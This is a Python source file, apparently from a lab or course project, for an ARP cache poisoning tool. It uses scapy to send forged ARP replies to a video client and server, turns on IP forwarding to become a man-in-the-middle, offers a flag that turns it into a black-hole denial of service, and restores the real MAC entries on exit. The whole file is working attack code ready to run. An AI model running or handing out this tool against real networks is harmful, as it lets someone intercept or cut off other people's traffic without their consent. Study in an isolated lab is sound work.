#!/usr/bin/env python3
"""
arp_spoof.py — ARP cache poisoning to become MITM (design proposal Section 2.3).

Both a Docker bridge and a physical LAN switch are learning switches, so passive
sniffing alone will NOT show the server<->client unicast video flow. This tool
poisons both victims' ARP caches so their traffic transits the attacker, and
enables IP forwarding so the stream keeps flowing (a clean MITM, not a DoS).

  * Tell the CLIENT that SERVER_IP is at the attacker's MAC.
  * Tell the SERVER that CLIENT_IP is at the attacker's MAC.

On Ctrl+C it restores the real MAC bindings on both victims.

Usage:
  python3 arp_spoof.py --client 172.20.0.20 --server 172.20.0.10 [-i eth0] [-t 2]
"""
import argparse
import os
import signal
import sys
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp

# Set when a stop signal (SIGINT/SIGTERM) is received. We use a flag rather than
# relying on KeyboardInterrupt because when this script is launched as a shell
# BACKGROUND job (e.g. from run_attack.sh), the shell sets SIGINT/SIGQUIT to
# "ignored" for the child (POSIX async-list behavior). Explicitly installing our
# own handlers below overrides that so Ctrl+C / kill -TERM actually reach us and
# the ARP caches get restored instead of the parent hanging on `wait`.
_stop = False


def _request_stop(signum, _frame):
    global _stop
    _stop = True


def get_mac(ip: str, iface: str, retries: int = 5):
    """Resolve an IP to its MAC via a broadcast ARP who-has."""
    for _ in range(retries):
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, iface=iface, verbose=0,
        )
        for _, r in ans:
            return r.hwsrc
        time.sleep(0.5)
    return None


def enable_ip_forward() -> None:
    path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(path, "w") as f:
            f.write("1")
        print("[arp] IP forwarding enabled (stream will keep flowing through us)")
    except Exception as e:
        print(f"[arp] WARNING: could not enable IP forwarding ({e}). "
              f"Run: echo 1 > {path}")


def poison(client_ip, client_mac, server_ip, server_mac, iface, my_mac) -> None:
    # op=2 is an (unsolicited) ARP reply: "<psrc> is-at <hwsrc=my_mac>".
    # Sent as a directed L2 unicast to each victim's real MAC.
    sendp(Ether(src=my_mac, dst=client_mac) /
          ARP(op=2, psrc=server_ip, hwsrc=my_mac, pdst=client_ip, hwdst=client_mac),
          iface=iface, verbose=0)
    sendp(Ether(src=my_mac, dst=server_mac) /
          ARP(op=2, psrc=client_ip, hwsrc=my_mac, pdst=server_ip, hwdst=server_mac),
          iface=iface, verbose=0)


def restore(client_ip, client_mac, server_ip, server_mac, iface, my_mac) -> None:
    print("[arp] restoring real ARP entries on both victims ...")
    sendp(Ether(src=my_mac, dst=client_mac) /
          ARP(op=2, psrc=server_ip, hwsrc=server_mac, pdst=client_ip, hwdst=client_mac),
          count=5, iface=iface, verbose=0)
    sendp(Ether(src=my_mac, dst=server_mac) /
          ARP(op=2, psrc=client_ip, hwsrc=client_mac, pdst=server_ip, hwdst=server_mac),
          count=5, iface=iface, verbose=0)


def main() -> int:
    ap = argparse.ArgumentParser(description="ARP cache poisoning MITM")
    ap.add_argument("--client", required=True, help="victim client IP")
    ap.add_argument("--server", required=True, help="video server IP")
    ap.add_argument("-i", "--iface", default="eth0", help="interface (default eth0)")
    ap.add_argument("-t", "--interval", type=float, default=2.0,
                    help="seconds between poison bursts (default 2)")
    ap.add_argument("--no-forward", action="store_true",
                    help="do NOT enable IP forwarding (turns MITM into a black-hole DoS)")
    args = ap.parse_args()

    conf.iface = args.iface
    my_mac = get_if_hwaddr(args.iface)
    print(f"[arp] iface={args.iface} attacker_mac={my_mac}")

    client_mac = get_mac(args.client, args.iface)
    server_mac = get_mac(args.server, args.iface)
    if not client_mac or not server_mac:
        print(f"[arp] FATAL: could not resolve MACs "
              f"(client={client_mac}, server={server_mac}). "
              f"Are the containers up and the interface correct?")
        return 1
    print(f"[arp] client {args.client} is at {client_mac}")
    print(f"[arp] server {args.server} is at {server_mac}")

    if not args.no_forward:
        enable_ip_forward()
    else:
        print("[arp] IP forwarding NOT enabled (--no-forward): this is a DoS, not a MITM")

    # Override any inherited "ignore SIGINT" disposition (see note at top) so we
    # respond to both Ctrl+C (SIGINT) and `kill -TERM` from the parent script.
    signal.signal(signal.SIGINT, _request_stop)
    signal.signal(signal.SIGTERM, _request_stop)

    print(f"[arp] poisoning every {args.interval:.1f}s. Ctrl+C (or SIGTERM) to stop and restore.")
    try:
        while not _stop:
            poison(args.client, client_mac, args.server, server_mac, args.iface, my_mac)
            # Sleep in small slices so a stop request is noticed within ~0.1s
            # instead of up to --interval seconds.
            slept = 0.0
            while slept < args.interval and not _stop:
                time.sleep(min(0.1, args.interval - slept))
                slept += 0.1
    finally:
        # Guarantee the restore runs to completion: ignore further stop signals
        # while we send the corrective ARP replies, so a second Ctrl+C can't
        # abort the restore half-way and leave the victims poisoned. (Only
        # SIGKILL from the parent's force-quit can interrupt this, by design.)
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        signal.signal(signal.SIGTERM, signal.SIG_IGN)
        print("\n[arp] stopping ...")
        restore(args.client, client_mac, args.server, server_mac, args.iface, my_mac)
    return 0


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[arp] must run as root (need raw sockets)", file=sys.stderr)
    sys.exit(main())
